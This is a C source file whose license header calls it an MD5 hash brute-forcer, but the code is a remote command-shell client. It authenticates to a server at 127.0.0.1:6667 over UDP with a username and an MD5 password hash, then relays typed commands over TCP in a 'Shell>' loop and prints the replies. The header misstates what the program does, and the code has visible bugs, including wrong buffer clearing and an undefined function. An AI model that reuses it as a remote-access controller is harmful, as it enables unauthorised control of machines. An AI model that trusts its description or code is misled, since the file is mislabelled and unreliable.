/*< [MD5_Brute_Forcer] -A programm created to decrypt an hash with brute forcing->
    Copyright (C) <2010>  <D4RKN355-H4CK>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.*/

#include <openssl/md5.h>
#include <RA_mkaccess.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <util.h>

#define PORT 6667
#define IP "127.0.0.1"
#define MAXLINE 1000
#define STOP "stop_execution"
#define REPLY 10000

int main(int argc, char *argv[]){
   
   int TCP, UDP, n_sent, n_recived;
   DATA access;
   struct sockaddr_in server;
   char reply, instruction[ MAXLINE ], output[ REPLY ];
   
   if( argc != 3 ){
   
      _usage( argv[ 0 ] );
      exit( EXIT_FAILURE );
      
   }
   
   _print_header();
   
   if( ( TCP = socket( AF_INET, SOCK_STREAM, 0 ) ) < 0 ){
   
      perror( "Errore creazione socket TCP" );
      exit( EXIT_FAILURE );
   
   }
   
   if( ( UDP = socket( AF_INET, SOCK_DGRAM, 0 ) ) < 0 ){
   
      perror( "Errore creazione socket UDP" );
      exit( EXIT_FAILURE );
   
   }
   
   _Md5( argv[ 2 ], &access );
   strcpy( access.username, argv[ 1 ] );
   server.sin_family = AF_INET;
   server.sin_port = htons( PORT );
   server.sin_addr.s_addr = inet_addr( IP );
   
   if( ( n_sent = sendto( UDP, &access, sizeof( access ), 0, ( struct sockaddr *) &server, sizeof( server ) ) ) < 0 ){
   
      perror( "Errore invio pacchetto UDP" );
      exit( EXIT_FAILURE );
   
   }
   
   if( ( n_recived = recvfrom( UDP, &reply, sizeof( reply ), 0, 0, 0 ) ) < 0 ){
   
      perror( "Errore ricezione pacchetto UDP" );
      exit( EXIT_FAILURE );
   
   }
   
   if( reply == 'C' ){
   
      printf( "Errore autenticazione\n" );
      exit( EXIT_FAILURE );
   
   }
   
   if( connect( TCP, (struct sockaddr *) &server, sizeof( server ) ) < 0 ){
   
      perror( "Errore connessione TCP" );
      exit( EXIT_FAILURE );
   
   }
   
   printf( "Shell> " );
   scanf( "%s", instruction );
   
   while( strcmp( instruction, STOP ) != 0 ){
   
      if( ( n_sent = send( TCP, instruction, sizeof( instruction ), 0 ) ) < 0 ){
      
         perror( "Errore invio dati" );
         exit( EXIT_FAILURE );
      
      }
      
      if( ( n_recived = recv( TCP, output, sizeof( output ), 0 ) ) < 0 ){
      
         perror( "Errore ricezione dati" );
         exit( EXIT_FAILURE );
      
      }
      
      printf( "%s\n", output );
      memset( instruction, 0, strlen( instruction ) );
      memset( output, 0 , strlen( instruction ) );
      printf( "Shell> " );
      scanf( "%s", instruction );
   
   }
   
   close( TCP );
   
   return 0;
   
}

void _usage( const char *name){

   printf( "Usage: \"%s < username > < password >\"\n", name );
   exit( EXIT_FAILURE );

}
